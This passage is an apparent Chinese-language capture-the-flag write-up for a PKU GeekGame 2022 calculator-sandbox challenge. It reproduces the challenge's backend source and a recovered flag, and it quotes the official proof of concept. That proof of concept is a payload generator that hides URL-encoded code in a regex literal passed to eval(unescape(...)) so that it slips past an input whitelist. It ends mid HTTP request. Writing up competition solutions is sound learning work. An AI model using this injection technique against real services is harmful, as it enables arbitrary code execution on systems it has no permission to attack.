<p>里面有个 flag0 常量，直接在 console 里执行后面的这段</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">_0x340c07</span><span class="token punctuation">(</span><span class="token number">0x65d</span><span class="token punctuation">,</span> <span class="token string">'aIlf'</span><span class="token punctuation">,</span> <span class="token number">0x554</span><span class="token punctuation">,</span> <span class="token number">0x7bc</span><span class="token punctuation">,</span> <span class="token number">0x7c0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x340c07</span><span class="token punctuation">(</span><span class="token number">0x522</span><span class="token punctuation">,</span> <span class="token string">'mxb3'</span><span class="token punctuation">,</span> <span class="token number">0x41a</span><span class="token punctuation">,</span> <span class="token number">0x61d</span><span class="token punctuation">,</span> <span class="token number">0x5ed</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x476726</span><span class="token punctuation">(</span><span class="token string">'Zml('</span><span class="token punctuation">,</span> <span class="token number">0x605</span><span class="token punctuation">,</span> <span class="token number">0x57c</span><span class="token punctuation">,</span> <span class="token number">0x6a1</span><span class="token punctuation">,</span> <span class="token number">0x5a5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x476726</span><span class="token punctuation">(</span><span class="token string">'UwsG'</span><span class="token punctuation">,</span> <span class="token number">0x5d6</span><span class="token punctuation">,</span> <span class="token number">0x5c1</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">,</span> <span class="token number">0x601</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x5e5705</span><span class="token punctuation">(</span><span class="token string">'mmNu'</span><span class="token punctuation">,</span> <span class="token number">0x1d0</span><span class="token punctuation">,</span> <span class="token number">0x354</span><span class="token punctuation">,</span> <span class="token number">0x339</span><span class="token punctuation">,</span> <span class="token number">0x1d1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">_0x476726</span><span class="token punctuation">(</span><span class="token string">'][gJ'</span><span class="token punctuation">,</span> <span class="token number">0x3b3</span><span class="token punctuation">,</span> <span class="token number">0x4c7</span><span class="token punctuation">,</span> <span class="token number">0x43a</span><span class="token punctuation">,</span> <span class="token number">0x401</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>就能拿到第一个 flag 了！</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124040440724.png"></p>
<p><code>flag{fr0nt3nd_log1c_m4tters}</code></p>
<h4 id="Flag-·-大"><a href="#Flag-·-大" class="headerlink" title="Flag · 大"></a>Flag · 大</h4><p>后面两个 flag 看他给的后端源码，应该是 ‘node’, ‘browser’ 各有一个</p>
<p>大概率是 nodejs 原型链污染一个，可能是 RCE？</p>
<p>另一个就是 chrome browser，访问 <code>sandbox.html</code> 获取其中的 flag 常量。</p>
<p><code>sandbox.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// @ts-check</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> launch <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'puppeteer'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> pathToFileURL <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'url'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> promisify <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'util'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> execFile <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'child_process'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> resolve <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'path'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">NODE_PATH</span><span class="token punctuation">,</span> <span class="token constant">ROOT_DIR</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./misc.js'</span>
<span class="token keyword">const</span> execFileAsync <span class="token operator">=</span> <span class="token function">promisify</span><span class="token punctuation">(</span>execFile<span class="token punctuation">)</span>
<span class="token keyword">const</span> sandboxUrl <span class="token operator">=</span> <span class="token function">pathToFileURL</span><span class="token punctuation">(</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token constant">ROOT_DIR</span><span class="token punctuation">,</span> <span class="token string">'sandbox.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>href

<span class="token comment">/**
 * @param {string} expr
 */</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runInNodeSandbox</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> args <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'--experimental-policy=policy.json'</span><span class="token punctuation">,</span>
    <span class="token string">'--policy-integrity=sha256-1NvUvTeQqHoo+XJv7zUAobD/VEaIGQ8CB3471GP2isY='</span><span class="token punctuation">,</span>
    <span class="token string">'runner.js'</span><span class="token punctuation">,</span>
    <span class="token string">'-e='</span> <span class="token operator">+</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span>
  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">execFileAsync</span><span class="token punctuation">(</span><span class="token constant">NODE_PATH</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>
    <span class="token literal-property property">cwd</span><span class="token operator">:</span> <span class="token constant">ROOT_DIR</span><span class="token punctuation">,</span>
    <span class="token literal-property property">shell</span><span class="token operator">:</span> <span class="token boolean">false</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * @param {string} expr
 */</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">runInBrowserSandbox</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    <span class="token literal-property property">executablePath</span><span class="token operator">:</span> <span class="token string">'google-chrome-stable'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>sandboxUrl<span class="token punctuation">)</span>
    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">throw</span> err
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124040958439.png" alt="sandbox.html"></p>
<p><code>index.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// @ts-check</span>
<span class="token keyword">import</span> fastify <span class="token keyword">from</span> <span class="token string">'fastify'</span>
<span class="token keyword">import</span> fastifyStatic <span class="token keyword">from</span> <span class="token string">'@fastify/static'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> join <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'path'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> runInNodeSandbox<span class="token punctuation">,</span> runInBrowserSandbox <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./sandbox.js'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> <span class="token constant">ROOT_DIR</span> <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./misc.js'</span>

<span class="token keyword">const</span> server <span class="token operator">=</span> <span class="token function">fastify</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

server<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>
  <span class="token string">'/submit'</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">schema</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'object'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">properties</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">expr</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'string'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">pattern</span><span class="token operator">:</span> <span class="token string">'^([a-z0-9+\\-*/%(), ]|([0-9]+[.])+[0-9]+)+$'</span>
          <span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token keyword">enum</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token string">'browser'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token literal-property property">required</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'expr'</span><span class="token punctuation">,</span> <span class="token string">'mode'</span><span class="token punctuation">]</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// @ts-ignore</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> expr<span class="token punctuation">,</span> mode <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body
    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token punctuation">(</span>mode <span class="token operator">===</span> <span class="token string">'node'</span>
      <span class="token operator">?</span> <span class="token function">runInNodeSandbox</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
      <span class="token operator">:</span> <span class="token function">runInBrowserSandbox</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span> result <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span>

server<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>fastifyStatic<span class="token punctuation">,</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">ROOT_DIR</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'frontend'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">'0.0.0.0'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>runner.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">typeof</span> e <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> arg <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> str<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'-e='</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arg<span class="token punctuation">)</span> process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> expression <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>arg<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>misc.js</code></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// @ts-check</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> fileURLToPath <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'url'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> dirname <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'path'</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> createRequire <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'module'</span>
<span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token function">fileURLToPath</span><span class="token punctuation">(</span><span class="token keyword">import</span><span class="token punctuation">.</span>meta<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">ROOT_DIR</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">NODE_PATH</span> <span class="token operator">=</span> process<span class="token punctuation">.</span>execPath
globalThis<span class="token punctuation">.</span>require <span class="token operator">=</span> <span class="token function">createRequire</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前端这里有个 premium user 相关的</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124041453731.png"></p>
<p>把 <code>main-premium.js</code> 下载下来</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> backend <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'backend'</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">appendOption</span><span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> option <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'option'</span><span class="token punctuation">)</span>
  option<span class="token punctuation">.</span>value <span class="token operator">=</span> value
  option<span class="token punctuation">.</span>textContent <span class="token operator">=</span> name
  backend<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token function">appendOption</span><span class="token punctuation">(</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token string">'Node.JS'</span><span class="token punctuation">)</span>
<span class="token function">appendOption</span><span class="token punctuation">(</span><span class="token string">'browser'</span><span class="token punctuation">,</span> <span class="token string">'Browser'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> original <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.calc-btn'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>
  <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> e<span class="token punctuation">.</span>textContent<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'='</span>
<span class="token punctuation">)</span>
<span class="token keyword">const</span> submit <span class="token operator">=</span> original<span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
submit<span class="token punctuation">.</span>style<span class="token punctuation">.</span>background <span class="token operator">=</span> <span class="token string">'#9b59b6'</span>
submit<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'white'</span>
original<span class="token punctuation">.</span><span class="token function">replaceWith</span><span class="token punctuation">(</span>submit<span class="token punctuation">)</span>

<span class="token keyword">const</span> display <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.display'</span><span class="token punctuation">)</span>
submit<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> expr <span class="token operator">=</span> display<span class="token punctuation">.</span>value
  display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'Calculating...'</span>
  <span class="token keyword">const</span> mode <span class="token operator">=</span> backend<span class="token punctuation">.</span>value
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'node'</span><span class="token punctuation">,</span> <span class="token string">'browser'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>mode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> expr<span class="token punctuation">,</span> mode <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    display<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'Error'</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>试了试 <code>i_am_premium_user</code> 作为 activation code，然而发现并没有用</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124041554519.png"></p>
<p>看起来这个应该还是在那堆混淆的 js 里。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"i_am_premium_user"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>没啥用的感觉（</p>
<p>还是看后端然后试着发包吧。</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124044009038.png"></p>
<p>哈哈，不能直接读 flag</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124042454404.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124045007141.png"></p>
<p>看起来是把包含 flag 的地方直接 replace 掉了</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124045134965.png"></p>
<p>唔，看起来页面里的 flag 变量就是这个，那应该还有点别的东西，还是得 <strong>读 head 部分的源码</strong> 了。</p>
<p><em>不懂了.jpg</em></p>
<p>赛后才知道，原来可以用 正则表达式 结合 url 编码（unescape）来绕过这个匹配的正则表达式（<code>^([a-z0-9+\\-*/%(), ]|([0-9]+[.])+[0-9]+)+$</code>）</p>
<p>这个 poc 来自 <a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-2nd/blob/master/official_writeup/ultimatesandbox/sol/poc.mjs">官方解法</a></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">flag{.+}</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">function</span> <span class="token function">generatePayload</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">eval(unescape(/%2f%0a</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token punctuation">[</span><span class="token operator">...</span>code<span class="token punctuation">]</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token string">'%'</span> <span class="token operator">+</span> _<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">%2f/))</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span>

<span class="token comment">// payload:</span>
<span class="token comment">// eval(unescape(/%2f%0a%2f%66%6c%61%67%7b%2e%2b%7d%2f%2e%65%78%65%63%28%64%6f%63%75%6d%65%6e%74%2e%71%75%65%72%79%53%65%6c%65%63%74%6f%72%28%27%73%63%72%69%70%74%27%29%2e%69%6e%6e%65%72%54%65%78%74%29%5b%30%5d%2f/))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231185923655.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/submit</span> <span class="token http-version property">HTTP/2</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob09-h5rdr7ox.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
